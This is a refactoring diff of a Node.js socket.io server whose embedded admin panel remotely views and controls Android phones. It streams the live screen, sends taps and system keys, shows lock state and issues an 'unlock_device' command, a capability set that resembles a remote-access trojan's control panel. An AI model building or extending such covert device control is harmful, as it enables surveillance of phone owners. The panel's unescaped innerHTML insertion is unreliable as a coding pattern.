@@ -1,7 +1,6 @@
 const express = require('express');
 const http = require('http');
 const socketIo = require('socket.io');
-const path = require('path');
 
 const app = express();
 const server = http.createServer(app);
@@ -19,9 +18,8 @@ app.use(express.json());
 const devices = new Map();
 const admins = new Map();
 
-// HTML PANEL - एक ही फाइल में सब कुछ
-const HTML_PANEL = `
-<!DOCTYPE html>
+// SIMPLIFIED HTML PANEL - Template literals को escape किया गया
+const HTML_PANEL = `<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -1104,7 +1102,7 @@ const HTML_PANEL = `
                         const centerX = parseInt(elementData.x) + parseInt(elementData.width) / 2;
                         const centerY = parseInt(elementData.y) + parseInt(elementData.height) / 2;
                         
-                        sendClickCommand(centerX, centerY, `ai-${elementData.type || 'element'}`);
+                        sendClickCommand(centerX, centerY, 'ai-' + (elementData.type || 'element'));
                         
                         clickedOnAIElement = true;
                         break;
@@ -1177,13 +1175,11 @@ const HTML_PANEL = `
             
             // Update debug info
             if (state.debugMode) {
-                UIElements.debugInfo.innerHTML = \`
-                    🔍 Click Details:<br>
-                    Screen: \${finalX}, \${finalY}<br>
-                    Container: \${Math.round(clickX + offsetX)}, \${Math.round(clickY + offsetY)}<br>
-                    Calibration: \${state.calibrationOffset.x}, \${state.calibrationOffset.y}<br>
-                    Scale: \${scaleX.toFixed(2)}, \${scaleY.toFixed(2)}
-                \`;
+                UIElements.debugInfo.innerHTML = '🔍 Click Details:<br>' +
+                    'Screen: ' + finalX + ', ' + finalY + '<br>' +
+                    'Container: ' + Math.round(clickX + offsetX) + ', ' + Math.round(clickY + offsetY) + '<br>' +
+                    'Calibration: ' + state.calibrationOffset.x + ', ' + state.calibrationOffset.y + '<br>' +
+                    'Scale: ' + scaleX.toFixed(2) + ', ' + scaleY.toFixed(2);
                 UIElements.debugInfo.style.display = 'block';
             }
         }
@@ -1200,23 +1196,22 @@ const HTML_PANEL = `
             state.calibrationOffset.x += e.shiftKey ? -10 : 10;
             state.calibrationOffset.y += e.ctrlKey ? -10 : 10;
             
-            UIElements.debugInfo.innerHTML = \`
-                🔧 Calibration Adjusted<br>
-                Offset: \${state.calibrationOffset.x}, \${state.calibrationOffset.y}<br>
-                Click at: \${Math.round(clickX)}, \${Math.round(clickY)}<br>
-                <small>Shift/Ctrl for negative adjustment</small>
-            \`;
+            UIElements.debugInfo.innerHTML = '🔧 Calibration Adjusted<br>' +
+                'Offset: ' + state.calibrationOffset.x + ', ' + state.calibrationOffset.y + '<br>' +
+                'Click at: ' + Math.round(clickX) + ', ' + Math.round(clickY) + '<br>' +
+                '<small>Shift/Ctrl for negative adjustment</small>';
             UIElements.debugInfo.style.display = 'block';
             
             setTimeout(() => {
                 UIElements.debugInfo.style.display = 'none';
             }, 3000);
             
-            console.log(\`🔧 Calibration offset: \${state.calibrationOffset.x}, \${state.calibrationOffset.y}\`);
+            console.log('🔧 Calibration offset: ' + state.calibrationOffset.x + ', ' + state.calibrationOffset.y);
         }
 
-        function sendClickCommand(x, y, type = 'touch') {
-            console.log(\`🎯 Sending \${type}: x=\${x}, y=\${y}\`);
+        function sendClickCommand(x, y, type) {
+            type = type || 'touch';
+            console.log('🎯 Sending ' + type + ': x=' + x + ', y=' + y);
             
             sendCommand('touch_command', { 
                 x: x, 
@@ -1244,12 +1239,12 @@ const HTML_PANEL = `
 
         function showClickFeedback(screenX, screenY, originalX, originalY) {
             // Show marker
-            UIElements.clickMarker.style.left = \`\${screenX}px\`;
-            UIElements.clickMarker.style.top = \`\${screenY}px\`;
+            UIElements.clickMarker.style.left = screenX + 'px';
+            UIElements.clickMarker.style.top = screenY + 'px';
             UIElements.clickMarker.style.display = 'block';
             
             // Update coordinates display
-            UIElements.coordsDisplay.textContent = \`Click: x=\${originalX}, y=\${originalY}\`;
+            UIElements.coordsDisplay.textContent = 'Click: x=' + originalX + ', y=' + originalY;
             UIElements.coordsDisplay.style.display = 'block';
             
             // Auto-hide
@@ -1275,7 +1270,7 @@ const HTML_PANEL = `
             let folderCount = 0;
             let uiCount = 0;
             
-            detectedElements.forEach((element, index) => {
+            detectedElements.forEach(function(element, index) {
                 if (!element.x || !element.y || !element.width || !element.height) return;
                 
                 const elementDiv = document.createElement('div');
@@ -1293,10 +1288,10 @@ const HTML_PANEL = `
                 const scaledHeight = element.height * state.currentScale.y;
                 
                 // Set position and size
-                elementDiv.style.left = \`\${scaledX}px\`;
-                elementDiv.style.top = \`\${scaledY}px\`;
-                elementDiv.style.width = \`\${scaledWidth}px\`;
-                elementDiv.style.height = \`\${scaledHeight}px\`;
+                elementDiv.style.left = scaledX + 'px';
+                elementDiv.style.top = scaledY + 'px';
+                elementDiv.style.width = scaledWidth + 'px';
+                elementDiv.style.height = scaledHeight + 'px';
                 elementDiv.style.borderColor = elementInfo.borderColor;
                 elementDiv.style.background = elementInfo.bgColor;
                 
@@ -1322,7 +1317,8 @@ const HTML_PANEL = `
                 iconDiv.textContent = elementInfo.emoji || elementInfo.text;
                 
                 const textSpan = document.createElement('span');
-                const displayText = element.text ? element.text.substring(0, 10) : elementType.replace('app_', '').replace('folder_', '').replace('ui_', '');
+                const displayText = element.text ? element.text.substring(0, 10) : 
+                    elementType.replace('app_', '').replace('folder_', '').replace('ui_', '');
                 textSpan.textContent = displayText.length > 8 ? displayText.substring(0, 8) + '...' : displayText;
                 
                 labelDiv.appendChild(iconDiv);
@@ -1346,14 +1342,12 @@ const HTML_PANEL = `
             
             // Update AI stats
             const totalElements = detectedElements.length;
-            UIElements.aiStats.innerHTML = \`
-                🤖 AI Detection<br>
-                Apps: \${appCount} | Folders: \${folderCount}<br>
-                UI Elements: \${uiCount} | Total: \${totalElements}
-            \`;
+            UIElements.aiStats.innerHTML = '🤖 AI Detection<br>' +
+                'Apps: ' + appCount + ' | Folders: ' + folderCount + '<br>' +
+                'UI Elements: ' + uiCount + ' | Total: ' + totalElements;
             UIElements.aiStats.style.display = 'block';
             
-            console.log(\`🤖 Rendered \${totalElements} AI elements (\${appCount} apps, \${folderCount} folders, \${uiCount} UI)\`);
+            console.log('🤖 Rendered ' + totalElements + ' AI elements (' + appCount + ' apps, ' + folderCount + ' folders, ' + uiCount + ' UI)');
         }
 
         function showElementDetails(element) {
@@ -1361,51 +1355,52 @@ const HTML_PANEL = `
             
             const detailPanel = document.createElement('div');
             detailPanel.className = 'element-detail-panel';
-            detailPanel.style.cssText = \`
-                position: absolute;
-                top: 60px;
-                left: 20px;
-                background: rgba(30, 30, 30, 0.95);
-                border: 2px solid \${elementInfo.borderColor};
-                border-radius: 12px;
-                padding: 15px;
-                width: 250px;
-                z-index: 1000;
-                box-shadow: 0 10px 30px rgba(0,0,0,0.7);
-                backdrop-filter: blur(10px);
-            \`;
+            detailPanel.style.cssText = 'position: absolute;' +
+                'top: 60px;' +
+                'left: 20px;' +
+                'background: rgba(30, 30, 30, 0.95);' +
+                'border: 2px solid ' + elementInfo.borderColor + ';' +
+                'border-radius: 12px;' +
+                'padding: 15px;' +
+                'width: 250px;' +
+                'z-index: 1000;' +
+                'box-shadow: 0 10px 30px rgba(0,0,0,0.7);' +
+                'backdrop-filter: blur(10px);';
             
-            detailPanel.innerHTML = \`
-                <div style="color: \${elementInfo.borderColor}; font-weight: bold; margin-bottom: 10px; font-size: 14px; display: flex; align-items: center; gap: 8px;">
-                    <span style="background: \${elementInfo.bgColor}; padding: 3px 8px; border-radius: 5px; color: white;">
-                        \${elementInfo.emoji || elementInfo.text}
-                    </span>
-                    \${elementInfo.name || element.type}
-                </div>
-                <div style="font-size: 12px; color: #ccc;">
-                    <div style="margin-bottom: 8px; padding: 5px; background: rgba(255,255,255,0.05); border-radius: 5px;">
-                        <span style="color: \${elementInfo.borderColor}; font-weight: bold;">Type:</span>
-                        <span style="color: #fff;"> \${element.type}</span>
-                    </div>
-                    \${element.text ? \`
-                    <div style="margin-bottom: 8px; padding: 5px; background: rgba(255,255,255,0.05); border-radius: 5px;">
-                        <span style="color: \${elementInfo.borderColor}; font-weight: bold;">Text:</span>
-                        <span style="color: #fff;"> \${element.text}</span>
-                    </div>\` : ''}
-                    <div style="margin-bottom: 8px; padding: 5px; background: rgba(255,255,255,0.05); border-radius: 5px;">
-                        <span style="color: \${elementInfo.borderColor}; font-weight: bold;">Position:</span>
-                        <span style="color: #fff;"> \${element.x}, \${element.y}</span>
-                    </div>
-                    <div style="margin-bottom: 8px; padding: 5px; background: rgba(255,255,255,0.05); border-radius: 5px;">
-                        <span style="color: \${elementInfo.borderColor}; font-weight: bold;">Size:</span>
-                        <span style="color: #fff;"> \${element.width} × \${element.height}</span>
-                    </div>
-                    <button onclick="window.clickElementAt(\${element.x + element.width/2}, \${element.y + element.height/2})" 
-                            style="background: \${elementInfo.bgColor}; color: white; border: none; padding: 5px 10px; border-radius: 5px; cursor: pointer; width: 100%;">
-                        🎯 Click This Element
-                    </button>
-                </div>
-            \`;
+            let html = '<div style="color: ' + elementInfo.borderColor + '; font-weight: bold; margin-bottom: 10px; font-size: 14px; display: flex; align-items: center; gap: 8px;">' +
+                '<span style="background: ' + elementInfo.bgColor + '; padding: 3px 8px; border-radius: 5px; color: white;">' +
+                (elementInfo.emoji || elementInfo.text) +
+                '</span>' +
+                (elementInfo.name || element.type) +
+                '</div>' +
+                '<div style="font-size: 12px; color: #ccc;">' +
+                '<div style="margin-bottom: 8px; padding: 5px; background: rgba(255,255,255,0.05); border-radius: 5px;">' +
+                '<span style="color: ' + elementInfo.borderColor + '; font-weight: bold;">Type:</span>' +
+                '<span style="color: #fff;"> ' + element.type + '</span>' +
+                '</div>';
+            
+            if (element.text) {
+                html += '<div style="margin-bottom: 8px; padding: 5px; background: rgba(255,255,255,0.05); border-radius: 5px;">' +
+                    '<span style="color: ' + elementInfo.borderColor + '; font-weight: bold;">Text:</span>' +
+                    '<span style="color: #fff;"> ' + element.text + '</span>' +
+                    '</div>';
+            }
+            
+            html += '<div style="margin-bottom: 8px; padding: 5px; background: rgba(255,255,255,0.05); border-radius: 5px;">' +
+                '<span style="color: ' + elementInfo.borderColor + '; font-weight: bold;">Position:</span>' +
+                '<span style="color: #fff;"> ' + element.x + ', ' + element.y + '</span>' +
+                '</div>' +
+                '<div style="margin-bottom: 8px; padding: 5px; background: rgba(255,255,255,0.05); border-radius: 5px;">' +
+                '<span style="color: ' + elementInfo.borderColor + '; font-weight: bold;">Size:</span>' +
+                '<span style="color: #fff;"> ' + element.width + ' × ' + element.height + '</span>' +
+                '</div>' +
+                '<button onclick="window.clickElementAt(' + (element.x + element.width/2) + ', ' + (element.y + element.height/2) + ')" ' +
+                'style="background: ' + elementInfo.bgColor + '; color: white; border: none; padding: 5px 10px; border-radius: 5px; cursor: pointer; width: 100%;">' +
+                '🎯 Click This Element' +
+                '</button>' +
+                '</div>';
+            
+            detailPanel.innerHTML = html;
             
             document.body.appendChild(detailPanel);
             
@@ -1446,13 +1441,13 @@ const HTML_PANEL = `
                 renderAIElements(state.detectedElements);
             }
             
-            console.log(\`🤖 AI Detection \${state.aiDetectionMode ? 'enabled' : 'disabled'}\`);
+            console.log('🤖 AI Detection ' + (state.aiDetectionMode ? 'enabled' : 'disabled'));
         }
 
         function showAppGrid() {
             // Collect unique apps from detected elements
             const apps = new Map();
-            state.detectedElements.forEach(element => {
+            state.detectedElements.forEach(function(element) {
                 if (element.type && element.type.startsWith('app_')) {
                     const appType = element.type;
                     if (!apps.has(appType)) {
@@ -1478,7 +1473,7 @@ const HTML_PANEL = `
                 noAppsDiv.textContent = 'No apps detected yet';
                 UIElements.appGrid.appendChild(noAppsDiv);
             } else {
-                apps.forEach((appInfo, appType) => {
+                apps.forEach(function(appInfo, appType) {
                     const appDiv = document.createElement('div');
                     appDiv.className = 'app-icon';
                     appDiv.style.background = appInfo.bgColor;
@@ -1491,7 +1486,7 @@ const HTML_PANEL = `
                     
                     appDiv.appendChild(labelDiv);
                     
-                    appDiv.addEventListener('click', () => {
+                    appDiv.addEventListener('click', function() {
                         if (appInfo.element) {
                             const x = appInfo.element.x + appInfo.element.width / 2;
                             const y = appInfo.element.y + appInfo.element.height / 2;
@@ -1511,21 +1506,20 @@ const HTML_PANEL = `
             // Reset calibration
             state.calibrationOffset = { x: 0, y: 0 };
             
-            UIElements.debugInfo.innerHTML = \`
-                🎯 Calibration Mode Active<br>
-                Click anywhere to test<br>
-                Right-click to adjust (+10 each)<br>
-                Shift+Right-click: -10 X<br>
-                Ctrl+Right-click: -10 Y<br>
-                Current: \${state.calibrationOffset.x}, \${state.calibrationOffset.y}
-            \`;
+            UIElements.debugInfo.innerHTML = '🎯 Calibration Mode Active<br>' +
+                'Click anywhere to test<br>' +
+                'Right-click to adjust (+10 each)<br>' +
+                'Shift+Right-click: -10 X<br>' +
+                'Ctrl+Right-click: -10 Y<br>' +
+                'Current: ' + state.calibrationOffset.x + ', ' + state.calibrationOffset.y;
             UIElements.debugInfo.style.display = 'block';
             
             console.log('🔧 Entering calibration mode');
         }
 
         // SOCKET FUNCTIONS
-        function sendCommand(action, payload = {}) {
+        function sendCommand(action, payload) {
+            payload = payload || {};
             if (!state.activeDeviceId) {
                 console.warn('No active device selected');
                 return;
@@ -1537,18 +1531,18 @@ const HTML_PANEL = `
                 socket.connect();
                 
                 if (!state.pendingCommands) state.pendingCommands = [];
-                state.pendingCommands.push({ action, payload, timestamp: Date.now() });
+                state.pendingCommands.push({ action: action, payload: payload, timestamp: Date.now() });
                 return;
             }
             
             const seq = Date.now();
             const commandData = {
                 deviceId: state.activeDeviceId,
-                action,
-                payload: { ...payload, _seq: seq }
+                action: action,
+                payload: Object.assign({}, payload, { _seq: seq })
             };
             
-            console.log(\`📤 Sending \${action} to \${state.activeDeviceId}\`);
+            console.log('📤 Sending ' + action + ' to ' + state.activeDeviceId);
             socket.emit('command_to_device', commandData);
         }
 
@@ -1595,30 +1589,29 @@ const HTML_PANEL = `
             if (!device || !device.deviceId) return;
             
             const deviceId = device.deviceId;
-            state.devices[deviceId] = { 
-                ...state.devices[deviceId], 
-                ...device,
-                lastUpdated: Date.now(),
-                lastSeen: Date.now()
-            };
+            state.devices[deviceId] = Object.assign({}, 
+                state.devices[deviceId], 
+                device,
+                { lastUpdated: Date.now(), lastSeen: Date.now() }
+            );
             
-            let li = document.getElementById(\`device-\${deviceId}\`);
+            let li = document.getElementById('device-' + deviceId);
             if (!li) {
                 li = document.createElement('li');
                 li.className = 'device';
-                li.id = \`device-\${deviceId}\`;
-                li.addEventListener('click', () => {
+                li.id = 'device-' + deviceId;
+                li.addEventListener('click', function() {
                     if (device.socketId) {
-                        console.log(\`📱 Switching to device: \${device.deviceName}\`);
+                        console.log('📱 Switching to device: ' + device.deviceName);
                         state.activeDeviceId = deviceId;
-                        UIElements.deviceTitle.textContent = \`\${device.deviceName}\`;
-                        UIElements.lockStatus.textContent = \`Lock: \${device.lockType || 'Unknown'}\`;
+                        UIElements.deviceTitle.textContent = device.deviceName;
+                        UIElements.lockStatus.textContent = 'Lock: ' + (device.lockType || 'Unknown');
                         UIElements.lockStatus.style.color = device.lockType === 'locked' ? '#ff4444' : '#44ff44';
                         
                         showView('control-view');
                         
                         // Auto-start live stream after 1 second
-                        setTimeout(() => {
+                        setTimeout(function() {
                             startLiveStream();
                             setupClickHandler();
                         }, 1000);
@@ -1633,26 +1626,24 @@ const HTML_PANEL = `
             const batteryLevel = device.battery || 'N/A';
             const batteryColor = batteryLevel < 20 ? '#ff4444' : batteryLevel < 50 ? '#ffaa00' : '#44ff44';
             
-            li.innerHTML = \`
-                <div style="flex: 1;">
-                    <div class="device-name">\${device.deviceName || 'Unknown Device'}</div>
-                    <div class="device-info">
-                        📱 Android \${device.androidVersion || 'Unknown'} | 
-                        🔋 <span style="color: \${batteryColor}">\${batteryLevel}%</span> | 
-                        <span style="color: \${isOnline ? '#44ff44' : '#ff4444'}">
-                            \${isOnline ? '● Online' : '● Offline'}
-                        </span>
-                    </div>
-                </div>
-                <div style="display: flex; align-items: center; gap: 10px;">
-                    <span class="lock-badge \${device.lockType !== 'locked' ? 'unlocked' : ''}">
-                        \${(device.lockType || 'none').toUpperCase()}
-                    </span>
-                    <span class="status-dot" style="background-color: \${isOnline ? '#44ff44' : '#ff4444'}; 
-                         box-shadow: 0 0 10px \${isOnline ? '#44ff44' : '#ff4444'}">
-                    </span>
-                </div>
-            \`;
+            li.innerHTML = '<div style="flex: 1;">' +
+                '<div class="device-name">' + (device.deviceName || 'Unknown Device') + '</div>' +
+                '<div class="device-info">' +
+                '📱 Android ' + (device.androidVersion || 'Unknown') + ' | ' +
+                '🔋 <span style="color: ' + batteryColor + '">' + batteryLevel + '%</span> | ' +
+                '<span style="color: ' + (isOnline ? '#44ff44' : '#ff4444') + '">' +
+                (isOnline ? '● Online' : '● Offline') +
+                '</span>' +
+                '</div>' +
+                '</div>' +
+                '<div style="display: flex; align-items: center; gap: 10px;">' +
+                '<span class="lock-badge ' + (device.lockType !== 'locked' ? 'unlocked' : '') + '">' +
+                (device.lockType || 'none').toUpperCase() +
+                '</span>' +
+                '<span class="status-dot" style="background-color: ' + (isOnline ? '#44ff44' : '#ff4444') + '; ' +
+                'box-shadow: 0 0 10px ' + (isOnline ? '#44ff44' : '#ff4444') + '">' +
+                '</span>' +
+                '</div>';
         }
 
         function showView(viewId) {
@@ -1674,7 +1665,7 @@ const HTML_PANEL = `
         }
 
         // SOCKET.IO EVENT HANDLERS
-        socket.on('connect', () => {
+        socket.on('connect', function() {
             console.log('✅ CONNECTED to server');
             state.connectionStartTime = Date.now();
             state.connectionAttempts = 0;
@@ -1687,16 +1678,16 @@ const HTML_PANEL = `
             console.log('👑 Joined as admin');
         });
 
-        socket.on('disconnect', (reason) => {
+        socket.on('disconnect', function(reason) {
             console.warn('❌ DISCONNECTED from server. Reason:', reason);
             
             UIElements.connectionDot.className = 'connection-dot disconnected';
-            UIElements.connectionStatusText.textContent = \`Disconnected: \${reason}\`;
+            UIElements.connectionStatusText.textContent = 'Disconnected: ' + reason;
             UIElements.connectionStatusText.style.color = '#ff4444';
             
             state.connectionAttempts++;
             
-            setTimeout(() => {
+            setTimeout(function() {
                 if (!socket.connected) {
                     console.log('🔄 Attempting to reconnect...');
                     socket.connect();
@@ -1704,39 +1695,39 @@ const HTML_PANEL = `
             }, 2000);
         });
 
-        socket.on('connect_error', (error) => {
+        socket.on('connect_error', function(error) {
             console.error('🔌 Connection error:', error.message);
-            UIElements.connectionStatusText.textContent = \`Error: \${error.message}\`;
+            UIElements.connectionStatusText.textContent = 'Error: ' + error.message;
             UIElements.connectionStatusText.style.color = '#ffaa00';
         });
 
-        socket.on('reconnect', (attemptNumber) => {
-            console.log(\`🔄 RECONNECTED after \${attemptNumber} attempts\`);
+        socket.on('reconnect', function(attemptNumber) {
+            console.log('🔄 RECONNECTED after ' + attemptNumber + ' attempts');
             UIElements.connectionStatusText.textContent = 'Reconnected ✓';
             UIElements.connectionStatusText.style.color = '#44ff44';
         });
 
         // DEVICE DATA HANDLERS
-        socket.on('device_list', (initialDevices) => {
-            console.log(\`📋 Received \${initialDevices.length} devices\`);
+        socket.on('device_list', function(initialDevices) {
+            console.log('📋 Received ' + initialDevices.length + ' devices');
             UIElements.deviceList.innerHTML = '';
             state.devices = {};
             
-            initialDevices.forEach(device => {
+            initialDevices.forEach(function(device) {
                 if (device && device.deviceId) {
                     updateDeviceInList(device);
                 }
             });
         });
 
-        socket.on('new_device_joined', (device) => {
-            console.log(\`➕ New device joined: \${device.deviceName}\`);
+        socket.on('new_device_joined', function(device) {
+            console.log('➕ New device joined: ' + device.deviceName);
             updateDeviceInList(device);
         });
 
-        socket.on('device_disconnected', (deviceId) => {
-            console.log(\`➖ Device disconnected: \${deviceId}\`);
-            const el = document.getElementById(\`device-\${deviceId}\`);
+        socket.on('device_disconnected', function(deviceId) {
+            console.log('➖ Device disconnected: ' + deviceId);
+            const el = document.getElementById('device-' + deviceId);
             if (el) {
                 el.querySelector('.status-dot').style.backgroundColor = '#ff4444';
             }
@@ -1751,18 +1742,18 @@ const HTML_PANEL = `
             }
         });
 
-        socket.on('device_heartbeat', (data) => {
+        socket.on('device_heartbeat', function(data) {
             if (data && data.deviceId && state.devices[data.deviceId]) {
-                updateDeviceInList({...state.devices[data.deviceId], ...data});
+                updateDeviceInList(Object.assign({}, state.devices[data.deviceId], data));
                 
                 if (data.deviceId === state.activeDeviceId) {
-                    UIElements.lockStatus.textContent = \`Lock: \${data.lockType || 'Unknown'}\`;
+                    UIElements.lockStatus.textContent = 'Lock: ' + (data.lockType || 'Unknown');
                     UIElements.lockStatus.style.color = data.lockType === 'locked' ? '#ff4444' : '#44ff44';
                 }
             }
         });
 
-        socket.on('live_screen', (data) => {
+        socket.on('live_screen', function(data) {
             if (!data || !data.liveImage) return;
             
             if (data.deviceId !== state.activeDeviceId || !state.isLiveStreaming) return;
@@ -1779,10 +1770,10 @@ const HTML_PANEL = `
             }
             
             // Update screen image
-            UIElements.liveScreenImage.src = \`data:image/jpeg;base64,\${data.liveImage}\`;
+            UIElements.liveScreenImage.src = 'data:image/jpeg;base64,' + data.liveImage;
             
             // Update alt text with dimensions
-            UIElements.liveScreenImage.alt = \`Live Screen - \${state.screenDimensions.width}x\${state.screenDimensions.height}\`;
+            UIElements.liveScreenImage.alt = 'Live Screen - ' + state.screenDimensions.width + 'x' + state.screenDimensions.height;
             
             // Store image data
             state.currentImageData = data;
@@ -1805,12 +1796,12 @@ const HTML_PANEL = `
         });
 
         // UI EVENT LISTENERS
-        UIElements.backToListBtn.onclick = () => {
+        UIElements.backToListBtn.onclick = function() {
             console.log('← Going back to device list');
             showView('device-list-view');
         };
 
-        UIElements.liveScreenBtn.onclick = () => {
+        UIElements.liveScreenBtn.onclick = function() {
             if (!state.isLiveStreaming) {
                 startLiveStream();
             } else {
@@ -1821,7 +1812,7 @@ const HTML_PANEL = `
         UIElements.aiModeBtn.onclick = toggleAIMode;
         UIElements.appGridBtn.onclick = showAppGrid;
         UIElements.calibrateBtn.onclick = calibrateClick;
-        UIElements.refreshAIBtn.onclick = () => {
+        UIElements.refreshAIBtn.onclick = function() {
             if (state.currentImageData && state.currentImageData.detectedElements) {
                 renderAIElements(state.currentImageData.detectedElements);
                 console.log('🔍 Refreshed AI elements');
@@ -1831,17 +1822,17 @@ const HTML_PANEL = `
         // CONTROL BUTTONS
         document.getElementById('btn-start-stream').onclick = startLiveStream;
         document.getElementById('btn-stop-stream').onclick = stopLiveStream;
-        document.getElementById('btn-wake-unlock').onclick = () => sendCommand('unlock_device');
-        document.getElementById('btn-back').onclick = () => sendCommand('global_action', { action: 'back' });
-        document.getElementById('btn-home').onclick = () => sendCommand('global_action', { action: 'home' });
-        document.getElementById('btn-recents').onclick = () => sendCommand('global_action', { action: 'recents' });
-        document.getElementById('btn-scroll-up').onclick = () => sendCommand('scroll_action', { direction: 'up' });
-        document.getElementById('btn-scroll-down').onclick = () => sendCommand('scroll_action', { direction: 'down' });
-        document.getElementById('btn-scroll-left').onclick = () => sendCommand('scroll_action', { direction: 'left' });
-        document.getElementById('btn-scroll-right').onclick = () => sendCommand('scroll_action', { direction: 'right' });
+        document.getElementById('btn-wake-unlock').onclick = function() { sendCommand('unlock_device'); };
+        document.getElementById('btn-back').onclick = function() { sendCommand('global_action', { action: 'back' }); };
+        document.getElementById('btn-home').onclick = function() { sendCommand('global_action', { action: 'home' }); };
+        document.getElementById('btn-recents').onclick = function() { sendCommand('global_action', { action: 'recents' }); };
+        document.getElementById('btn-scroll-up').onclick = function() { sendCommand('scroll_action', { direction: 'up' }); };
+        document.getElementById('btn-scroll-down').onclick = function() { sendCommand('scroll_action', { direction: 'down' }); };
+        document.getElementById('btn-scroll-left').onclick = function() { sendCommand('scroll_action', { direction: 'left' }); };
+        document.getElementById('btn-scroll-right').onclick = function() { sendCommand('scroll_action', { direction: 'right' }); };
 
         // KEYBOARD SHORTCUTS
-        document.addEventListener('keydown', (e) => {
+        document.addEventListener('keydown', function(e) {
             if (!state.isLiveStreaming) return;
             
             switch(e.key) {
@@ -1867,14 +1858,14 @@ const HTML_PANEL = `
                 case 'D':
                     if (e.ctrlKey) {
                         state.debugMode = !state.debugMode;
-                        console.log(\`🐛 Debug mode \${state.debugMode ? 'enabled' : 'disabled'}\`);
+                        console.log('🐛 Debug mode ' + (state.debugMode ? 'enabled' : 'disabled'));
                     }
                     break;
             }
         });
 
         // PERIODIC UPDATES
-        setInterval(() => {
+        setInterval(function() {
             if (socket.connected) {
                 const uptime = Math.floor((Date.now() - state.connectionStartTime) / 1000);
                 const hours = Math.floor(uptime / 3600);
@@ -1882,7 +1873,7 @@ const HTML_PANEL = `
                 const seconds = uptime % 60;
                 
                 UIElements.connectionStats.textContent = 
-                    \`Uptime: \${hours}h \${minutes}m \${seconds}s | Devices: \${Object.keys(state.devices).length}\`;
+                    'Uptime: ' + hours + 'h ' + minutes + 'm ' + seconds + 's | Devices: ' + Object.keys(state.devices).length;
             }
         }, 1000);
 
@@ -1902,8 +1893,7 @@ const HTML_PANEL = `
 
     </script>
 </body>
-</html>
-`;
+</html>`;
 
 // MAIN SERVER CODE
 app.get('/', (req, res) => {
